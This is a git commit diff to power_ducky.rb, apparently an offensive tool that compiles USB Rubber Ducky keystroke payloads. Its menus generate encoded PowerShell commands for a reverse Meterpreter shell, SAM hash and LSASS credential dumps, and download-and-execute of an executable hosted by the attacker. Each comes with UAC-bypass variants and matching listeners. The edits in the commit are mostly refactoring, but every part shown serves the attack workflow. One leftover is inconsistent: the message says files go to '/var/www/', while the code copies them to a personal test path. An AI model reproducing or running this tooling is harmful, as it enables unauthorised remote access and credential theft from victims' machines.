d22077f0690df5c28611d90d550c275988d659d0
b00stfr3ak <goduke44@gmail.com>
2013-09-14 01:36:07 -0700

    Random File Name for Wget
    wget works with random name or not.
    removed class var
    changed requrie to relative path

--- power_ducky.rb
+++ power_ducky.rb
@@ -1,10 +1,9 @@
 #!/usr/bin/env ruby
-#require './lib/core'
 require_relative './lib/core'
-require './lib/menu'
-require './lib/server_setup'
-require './lib/powershell_commands'
-require './lib/ducky_setup'
+require_relative './lib/menu'
+require_relative './lib/server_setup'
+require_relative './lib/powershell_commands'
+require_relative './lib/ducky_setup'
 include MainCommands
 include MsfCommands
 include Menu
@@ -14,27 +13,29 @@ def server(attack)
   @server_setup = ServerSetUp.new
   host = @server_setup.get_host
   if attack == 'hash_dump'
-  port = @server_setup.get_port
+    port = @server_setup.get_port
     powershell_command = powershell_hash_dump(host,port)
     return host,port,powershell_command
   elsif attack == 'lsass_dump'
-  port = @server_setup.get_port
+    port = @server_setup.get_port
     powershell_command1,powershell_command2 = powershell_lsass_dump(host,port)
     return host,port,powershell_command1,powershell_command2
   elsif attack == 'wget'
-    file_path = Readline.readline("#{get_input('Enter full path to executable: ')} ", true)
-    random_name = Readline.readline("#{get_input('Would you like to randomize the file name?[yes/no] ')} ", true)
-    if random_name == 'yes'
-      print_info("Creating Radom Name!\n")
-      rand_name = random_name_gen
-      executable = file_path.split('/')[-1]
-      executable = file_path.gsub(executable,rand_name)
+    file_path = [(get_input('Enter full path to executable: ') ), $stdin.gets.rstrip][1]
+    file_name = file_path.split('/')[-1]
+    random_name_answer = [(get_input('Would you like to randomize the file name?[yes/no] ') ), $stdin.gets.rstrip][1]
+    if random_name_answer == 'yes'
+      print_info("Creating Random Name!\n")
+      random_name = random_name_gen
+      #new_file_name = file_name.gsub(file_name,random_name)
+      print_info("Copying #{file_name} to '/var/www/'\n")
+      FileUtils.copy(file_path,"/home/james/test/#{random_name}")
+      powershell_command = powershell_wget_powershell(host,random_name)
     else
-      executable = file_path.split('/')[-1]
+      print_info("Copying #{file_name} to '/var/www/'\n")
+      FileUtils.copy(file_path,"/home/james/test/#{file_name}")
+      powershell_command = powershell_wget_powershell(host,file_name)
     end
-    print_info("Copying #{file_path} to '/var/www/'\n")
-    FileUtils.copy(file_path,'/var/www/')
-    powershell_command = powershell_wget_powershell(host,executable)
     return powershell_command
   end
 end
@@ -72,7 +73,7 @@ def case_main_menu
     when '99'
       exit
     else
-      print_error("Bad Choice")
+      print_error('Bad Choice')
       sleep(1)
       case_main_menu
   end
@@ -85,26 +86,26 @@ def case_reverse_meterpreter_menu
       print_info("Creating Text File!\n")
       meterpreter_uac(encode_command(powershell_command))
       print_info("Compiling Text to Bin!\n")
-      compile_ducky(@@reverse_meterpreter_file)
+      compile_ducky(reverse_meterpreter_file)
       start_msf(host,port)
     when '2'
       powershell_command,host,port = meterpreter_setup
       print_info("Creating Text File!\n")
       meterpreter_no_uac(encode_command(powershell_command))
       print_info("Compiling Text to Bin!\n")
-      compile_ducky(@@reverse_meterpreter_file)
+      compile_ducky(reverse_meterpreter_file)
       start_msf(host,port)
 	  when '3'
       powershell_command,host,port = meterpreter_setup
       print_info("Creating Text File!\n")
       meterpreter_low(encode_command(powershell_command))
       print_info("Compiling Text to Bin!\n")
-      compile_ducky(@@reverse_meterpreter_file)
+      compile_ducky(reverse_meterpreter_file)
       start_msf(host,port)
     when '99'
       case_main_menu
     else
-      print_error("Bad Choice")
+      print_error('Bad Choice')
       sleep(1)
       case_reverse_meterpreter_menu
   end
@@ -118,19 +119,19 @@ def case_dump_hashes_menu
       print_info("Creating Text File!\n")
       hash_dump_uac(encode_command(powershell_command))
       print_info("Compiling Text to Bin!\n")
-      compile_ducky(@@hash_dump_file)
+      compile_ducky(hash_dump_file)
       start_hash_server(port)
     when '2'
       host,port,powershell_command = server(attack)
       print_info("Creating Text File!\n")
       hash_dump_no_uac(encode_command(powershell_command))
       print_info("Compiling Text to Bin!\n")
-      compile_ducky(@@hash_dump_file)
+      compile_ducky(hash_dump_file)
       start_hash_server(port)
     when '99'
       case_main_menu
     else
-      print_error("Bad Choice")
+      print_error('Bad Choice')
       sleep(1)
       case_dump_hashes_menu
   end
@@ -144,19 +145,19 @@ def case_dump_lsass_menu
       print_info("Creating Text File!\n")
       lsass_uac(encode_command(powershell_command1),encode_command(powershell_command2))
       print_info("Compiling Text to Bin!\n")
-      compile_ducky(@@lsass_dump_file)
+      compile_ducky(lsass_dump_file)
       start_lsass_server(port)
     when '2'
       host,port,powershell_command1,powershell_command2 = server(attack)
       print_info("Creating Text File!\n")
       lsass_no_uac(encode_command(powershell_command1),encode_command(powershell_command2))
       print_info("Compiling Text to Bin!\n")
-      compile_ducky(@@lsass_dump_file)
+      compile_ducky(lsass_dump_file)
       start_lsass_server(port)
     when '99'
       case_main_menu
     else
-      print_error("Bad Choice")
+      print_error('Bad Choice')
       sleep(1)
       case_dump_lsass_menu
   end 
@@ -170,21 +171,21 @@ def case_wget_menu
       powershell_command,executable = server(attack)
       print_info("Creating Text File!\n")
       wget_uac(encode_command(powershell_command))
-      compile_ducky(@@wget_file)  
+      compile_ducky(wget_file)
     when '2'
       powershell_command,executable = server(attack)
       print_info("Creating Text File!\n")
       wget_no_uac(encode_command(powershell_command))
-      compile_ducky(@@wget_file)  
+      compile_ducky(wget_file)
     when '3'
       powershell_command,executable = server(attack)
       print_info("Creating Text File!\n")  
       wget_low(encode_command(powershell_command))
-      compile_ducky(@@wget_file)  
+      compile_ducky(wget_file)
     when '99'
       case_main_menu
     else
-      print_error("Bad Choice")
+      print_error('Bad Choice')
       sleep(1)
       case_dump_lsass_menu
   end
